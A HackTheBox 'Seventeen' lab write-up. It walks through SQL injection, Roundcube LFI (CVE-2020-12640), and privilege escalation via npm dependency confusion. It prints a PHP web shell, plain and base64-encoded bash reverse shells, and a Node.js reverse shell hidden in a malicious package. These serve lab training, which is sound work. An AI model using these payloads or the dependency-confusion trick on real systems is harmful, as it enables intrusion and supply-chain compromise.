# HackTheBox - Seventeen

## NMAP

```bash
Host is up (0.20s latency).
Not shown: 59883 closed ports, 5649 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
|_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Let's begin your education with us! 
8000/tcp open  http    Apache httpd 2.4.38
| http-methods: 
|_  Supported Methods: POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.11; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 8000 (HTTP)
Visting this port, it was giving us forbidden error so this could be only accssible through local host

<img src="https://i.imgur.com/8haasIr.png"/>

## PORT 80 (HTTP)

The web server is using a template page, we don't see anything on the page except for a domain name `seventeen.htb`

<img src="https://i.imgur.com/JLYlenx.png"/>

Adding the domain name in `/etc/hosts` file

<img src="https://i.imgur.com/dOEIGGY.png"/>

Fuzzing for files and directories using `diresarch`, it didn't found anything

<img src="https://i.imgur.com/qbcbHFl.png"/>

It could be that there are other subdomains as there's nothing really on the seventeen.htb, we can fuzz for subdomains using `wfuzz`

```
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://seventeen.htb' -H "Host: FUZZ.seventeen.htb" --hh 20689
```

<img src="https://i.imgur.com/BYurrXC.png"/>

This returned us a valid response on `exam` so let's add this subdomain in /etc/hosts file

<img src="https://i.imgur.com/sKDluxR.png"/>

<img src="https://i.imgur.com/cHJd3XS.png"/>

Visting the `admin` page we'll see that it's disabled 

<img src="https://i.imgur.com/9DJzJz7.png"/>

Looking for exploits regarding Exam Revewier Management System, it showed two exploits

<img src="https://i.imgur.com/w1gPXjH.png"/>

<img src="https://i.imgur.com/zoMuVx3.png"/>

https://www.exploit-db.com/exploits/50725

Since the admin panel is disabled, the authenticated RCE exploit would be useless for us, so checking the sqli on this management system

<img src="https://i.imgur.com/8mvl58x.png"/>

On running `sqlmap` on this parameter it showed that this was vulnerable to sqli

<img src="https://i.imgur.com/wXRtaZi.png"/>

<img src="https://i.imgur.com/gUWt02Q.png"/>

The database for this management system was `erms_db` which showed a mangement named `oldmanagement`

<img src="https://i.imgur.com/Qg3mdF3.png"/>

Add this to /etc/hosts file did infact brought us to a login page

<img src="https://i.imgur.com/MwaBGBv.png"/>

<img src="https://i.imgur.com/W6PceI7.png"/>

Dumping the databases with `--dbs` we can see there are 2 more databases, which means that `db_sfms` might be for the oldmanagement 

<img src="https://i.imgur.com/3BHyWNf.png"/>

<img src="https://i.imgur.com/sj7SIvD.png"/>

From this database, it dumped `user` table which some hashes, also it retrieved hashes from `student` , so trying to crack them trough crackstation, only one hash was crackable

<img src="https://i.imgur.com/UeKIZWf.png"/>

Logging in with the credentials `31234:autodestruction`

<img src="https://i.imgur.com/Vb56sVA.png"/>

This user had uploaded a pdf document, we can download this document and see the contents which reveals antother subdomain `mastermailer.seventeen.htb` it also talks about some files uploaded somewhere

<img src="https://i.imgur.com/wkwtsUD.png"
/>

Fuzzing for files it found a directory called `files` but it showed that it was forbidden to access

<img src="https://i.imgur.com/04BhEPI.png"/>

<img src="https://i.imgur.com/glHmZBs.png"/>

The document mentioned about student's file being uploaded but we don't exaclty know if this is where the files are being uploaded, so I fuzz in files folder with student IDs

<img src="https://i.imgur.com/U4KGNmJ.png"/>

<img src="https://i.imgur.com/E4RVpxW.png"/>

Running gobuster again in this directory it found another directory called `papers`

<img src="https://i.imgur.com/OjHyy9u.png"/>

But this directory was also forbidden for us to access and after running gobuster in here showed nothing

<img src="https://i.imgur.com/YzOMWIQ.png"/>

Moving on to adding the subdomain in hosts file we can access mastermailer, I tried logging in with the default credentials which failed

<img src="https://i.imgur.com/Qgjn3kZ.png"/>

<img src="https://i.imgur.com/DAAJRaf.png"/>

Fuzzing for files on this site also showed some directories which were forbidden except for `/installer`

<img src="https://i.imgur.com/5sY50pS.png"/>

<img src="https://i.imgur.com/NtkhCha.png"/>


Going through the changelog on github for roudcube it was showing two vulnerabilities related to LFI and RCE which was found in several version prior to 1.44

<img src="https://i.imgur.com/X7wLRI7.png"/>

<img src="https://i.imgur.com/EeNhNOd.png"/>

<img src="https://i.imgur.com/vKHUASA.png"/>

<img src="https://i.imgur.com/ZtsUjYW.png"/>

On searching for this exploit the LFI matched our scenario as we didn't have creds to login, it was assigned a CVE number `2020-12640`

<img src="https://i.imgur.com/KDj1yXw.png"/>

Searching for poc for this exploit lead me to a github repo of the exploit 

<img src="https://i.imgur.com/FRqlowL.png"/>

https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12640-PHP%20Local%20File%20Inclusion-Roundcube

<img src="https://i.imgur.com/ZnWA6ci.png"/>


<img src="https://i.imgur.com/NSQ4GJk.png"/>

To exploit this we need first upload a php file named `papers.php`  having the contents

```php
<?php system($_GET['cmd']); ?>

```

<img src="https://i.imgur.com/R4x9BC7.png"/>

This file gets uploaded in  `/var/www/html/oldmanagement/files/31234`, so path traversal in plugin name would be `../../../../../../../../../../../../../../../var/www/html/oldmanagement/files/31234/papers` , we can perform directory traversal in any plugin name we want 

<img src="https://i.imgur.com/Q7aNQu1.png"/>

Here I have selected `zipdownload` plugin, intercept the request on update config and in `_plugins_zipdownload` perform directory traversal 

<img src="https://i.imgur.com/JycjUVg.png"/>

And now going to any php file we can include the GET parameter which was `cmd` along with the command to be executed

<img src="https://i.imgur.com/IUKCKLm.png"/>

I used bash reverse shell by converting into base64 and decoding by piping and piping again to execute it through bash

```bash
bash -i >& /dev/tcp/10.10.14.43/2222 0>&1

echo 'L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQzLzIyMjIgMD4mMScK' | base64 -d | bash

```

<img src="https://i.imgur.com/L4pk1af.png"/>

## Method 2 

If we try accessing the uploaded php file on the oldmangement system it will show a Forbidden error on the page

<img src="https://i.imgur.com/eIFHBb8.png"/>

But on changing the sutdent id at the time of uploading the file it will create a folder with that id and from there we can access the php file 

<img src="https://i.imgur.com/euY7s3l.png"/>


<img src="https://i.imgur.com/QSXBJKl.png"/>


Stabilizing the shell with `python`

<img src="https://i.imgur.com/NBiG1hO.png"/>

## Un-intended Foothold

We can try fuzzing for files and directories here with `dirsearch`

<img src="https://i.imgur.com/JZld7kC.png"/>

This found a directory `/vendor` which had some folders which lead to three sites

<img src="https://i.imgur.com/BYqKhNQ.png"/>

## Mastermailer

<img src="https://i.imgur.com/CZhTfQc.png"/>

I tried the default credentials there but they didn't worked

<img src="https://i.imgur.com/chIVJ1l.png"/>

## Old Management

This is  a school management system which is referred as old, so maybe there are vulnearbilities in this site

<img src="https://i.imgur.com/aeC6O60.png"/>

I looked at the source of the page and found that there maybe an admin panel

<img src="https://i.imgur.com/IsOPHjU.png"/>

I tried the default password admin:admin which is didn't worked here as well

<img src="https://i.imgur.com/srprovQ.png"/>

https://www.exploit-db.com/exploits/48437

On trying a basic sqli payload for bypassing login, it worked

<img src="https://i.imgur.com/xD7OoOZ.png"/>

There wasn't anything on this site so I moved on 

## Exams

The third site is a Exam Reviewer Management system

<img src="https://i.imgur.com/ig1oCgf.png"/>

This management also had vulnerabilities and there were two of them, first being sqli and the second authenticated remote code execution

https://www.exploit-db.com/exploits/50725

https://www.exploit-db.com/exploits/50726


<img src="https://i.imgur.com/adJBbpu.png"/>

The exploit shows that `?p=take_exam&id=1` is vulnearble to sqli, let's first verify as there wasn't a directory `erms`

<img src="https://i.imgur.com/CHzAVll.png"/>

Now running `sqlmap` on this url including the parameter

<img src="https://i.imgur.com/JoyBFcF.png"/>

<img src="https://i.imgur.com/k5EGqKW.png"/>

I tried logging in as admin on this site but admin login was disabled

<img src="https://i.imgur.com/mwcGYbd.png"/>

Going back to the oldmanagement site, I dumped the database and found a student's password hash which was cracked

<img src="https://i.imgur.com/1iAdpaG.png"/>

<img src="https://i.imgur.com/GiswAEP.png"/>

And logging in with the student id `31234` and password `autodestruction` it worked and we can see an option to upload a file

I uploaded a basic php shell

<img src="https://i.imgur.com/AeDziuo.png"/>

<img  src="https://i.imgur.com/vVVaAnz.png"/>

On which it just shows a blank page and doesn't upload a file, checking the `/files` in oldmanagement it also doesn't show the uploaded file

<img src="https://i.imgur.com/TgSEI5L.png"/>

Checking port 8000 again I saw that this management site was also being hosted there as well

<img src="https://i.imgur.com/PqAZ9Wo.png"/>

With the same credentials and if we upload a file here, it will show that it's uploaded

<img src="https://i.imgur.com/ag0V4Oc.png"/>

Also we can access it by using it's absolute path which is 

```
/oldmanagement/files/31234/test.php?cmd=id
```

<img src="https://i.imgur.com/Ckt7pjo.png"/>

Using bash reverse shell, converting into base64 and piping it to bash

<img src="https://i.imgur.com/7gmiXuI.png"/>

And we are inside a docker container, checking `/var/www/html` for files

<img src="https://i.imgur.com/Qiocgh3.png"/>


## Privilege Escalation (Mark)

From the oldmanagenemnt system files we can get mysql creds from `conn.php` 

<img src="https://i.imgur.com/L0PtV6R.png"/>

<img src="https://i.imgur.com/DT1ijSI.png"/>

But it was useless as we already had gotten the tables through sql injection, We do see another management system but it doesn't have database connected to it 

<img src="https://i.imgur.com/HdxRMVp.png"/>

<img src="https://i.imgur.com/bN4JgSY.png"/>

It gives an error on login for database connection which reveals the file where the credentials are stored for database, checking the `dbh.php` 

<img src="https://i.imgur.com/cerwfq3.png"/>

I tried using these credentials on the database but they didn't worked

<img src="https://i.imgur.com/WxJ8mS9.png"/>

Reading the `/etc/passwd` file from the container we can see an entry for `mark` user

<img src="https://i.imgur.com/yHHYFPb.png"/>


The password `2020bestyearofmylife`  worked for mark and we got access on the box 

## Privilege Escalation (kavi)

<img src="https://i.imgur.com/2g570TX.png"/>

Checking the home directory there's another user named `kavi` 

<img src="https://i.imgur.com/uwYQfZj.png"/>

On checking what files/folders this user owns

<img src="https://i.imgur.com/Thoov8A.png"/>

In  `/var/mail` there's a mail for kavi user which talks about a module, `loglevel` being published on the private registry

<img src="https://i.imgur.com/aPTPV6G.png"/>

From the `/opt/app` directory we see two intersting files `startup.sh` and `index.js`

<img src="https://i.imgur.com/PNKuCLq.png"/>

From the index.js, there's a module which has been removed, it was mentioned that plugins are being published to a private registry, so it could be that this  can be installed from that registry as there's a service running on port `4873` 

<img src="https://i.imgur.com/FotLvyM.png"/>

<img src="https://i.imgur.com/BgQdEZ2.png"/>

Which shows that it's running something called`Verdaccio` and on searching about this, this is actually used for private registry for node modules 


<img src="https://i.imgur.com/GOCPLz9.png"/>

But simply installing this module will not working as we need to make npm point to local registry

<img src="https://i.imgur.com/egp8k9x.png"/>

<img src="https://i.imgur.com/U1beuZS.png"/>

Now this module would be installed in `./node_modules` of user's directory

<img src="https://i.imgur.com/q07INfw.png"/>

From there we can get another password `IhateMathematics123#` which will allow us to switch to kavi user

<img src="https://i.imgur.com/BLwUc7s.png"/>



## Un-intended Privilege Escalation (kavi)

From the `/opt/app`  there was a module `db-logger` having password for mysql 

<img src="https://i.imgur.com/Vi6hvAh.png"/>

This password allowed to switch to kavi user

<img src="https://i.imgur.com/CfZbytY.png"/>

## Privilege Escalation (root)

Running `sudo -l` we can see that this user can execute  `/opt/app/startup.sh`

<img src="https://i.imgur.com/fDqwgE0.png"/>

```bash

cd /opt/app

deps=('db-logger' 'loglevel')

for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
    o=$(/usr/bin/npm -l ls|/bin/grep $dep)

    if [[ "$o" != *"$dep"* ]]; then
        /bin/echo "[+] Installing $dep"
        /usr/bin/npm install $dep
    else
        /bin/echo "[+] $dep already installed"

    fi
done

/bin/echo "[+] Starting the app"

/usr/bin/node /opt/app/index.js

```

This scripts looks for npm packages `db-logger` and `loglevel` , since db-logger is already in `node_modules` loglevel is something we should mess with, it will fetch this module if it isn't installed and then install this module, it will run `index.js` which includes loglevel and is being used

<img src="https://i.imgur.com/G1Rkxnd.png"/>

But we can't write in `/opt/app` as we have only read rights, right now this module isn't installed

<img src="https://i.imgur.com/rf61y0v.png"/>

So we can run the script so that this module can be installed

<img src="https://i.imgur.com/aNYrm3B.png"/>

<img src="https://i.imgur.com/Ymvxk43.png"/>

Here we can trick the `npm` to download loglevel from our hosted repository of node modules which leads to `Dependency Confusion` , which means that index.js will use our malicious loglevel plugin if the version is above than the current version it's fetching and we can already see that once it's installed the version is `1.8.0` so we need to create a module with a version higher than this 

https://0xsapra.github.io/website//Exploiting-Dependency-Confusion

But question is from where exacly is npm fetching packages from, if we check `.npmrc`  in kavi's home directory it's fetching the packages from the registry from localhost which was running on port 4873, it's weird because I didn't saw any package on this system

<img src="https://i.imgur.com/B44b0Na.png"/>

We can host our own registry for node modules using `Verdaccio`

https://medium.com/aeturnuminc/publish-and-resolving-npm-packages-using-private-npm-server-easy-step-by-step-c16f886d452f

Installing verdaccio with npm (make sure to have node version 12 or above)

```bash
npm install -g verdaccio
```

Starting vedaccio on tun0 interface 

```bash
verdaccio -l IP:4873
```

<img src="https://i.imgur.com/I0e9jfh.png"/>

We need to add a user before hosting node modules

<img src="https://i.imgur.com/ylJgy0k.png"/>

Following this template for making node modules I modified  `package.json` 

https://0xsapra.github.io/website//Exploiting-Dependency-Confusion

<img src="https://i.imgur.com/7JDi2st.png"/>

Adding a node reverse shell within a fucntion called `log` as it's going to be called in the js file, then publishing the node module

```javascript
function log (msg)
{
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(4444, "10.10.14.19", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
}

module.exports = { log }

```

<img src="https://i.imgur.com/IApa3mh.png"/>


Replacing the registry control with our hosted registry

<img src="https://i.imgur.com/hwttweT.png"/>

Then just starting our netcat listener and running the script

<img src="https://i.imgur.com/dCCcYjy.png"/>

## Un-intended (root)

We can see this moudle is installed now and we own this module so we can modify the contents of the javascript file

<img src="https://i.imgur.com/AjIkggy.png"/>

Just add a node js reverse shell anywhere in the `loglevel.js` file

<img src="https://i.imgur.com/fIzR8Ov.png"/>

After modifying, terminate the script and run it again so it runs with the changes in the module and we'll get a revere shell as a root user on our listener

<img src="https://i.imgur.com/SnGpx7b.png"/>

## References

- https://www.exploit-db.com/exploits/50725
-  https://roundcube.net/news/2020/04/29/security-updates-1.4.4-1.3.11-and-1.2.10
- https://github.com/roundcube/roundcubemail/releases?page=3
- https://attackerkb.com/topics/JQfuTdv5fa/cve-2020-12640/vuln-details
- https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12640-PHP%20Local%20File%20Inclusion-Roundcube
- https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/
- https://0xsapra.github.io/website//Exploiting-Dependency-Confusion
- https://github.com/nodesource/distributions/blob/master/README.md
- https://medium.com/aeturnuminc/publish-and-resolving-npm-packages-using-private-npm-server-easy-step-by-step-c16f886d452f

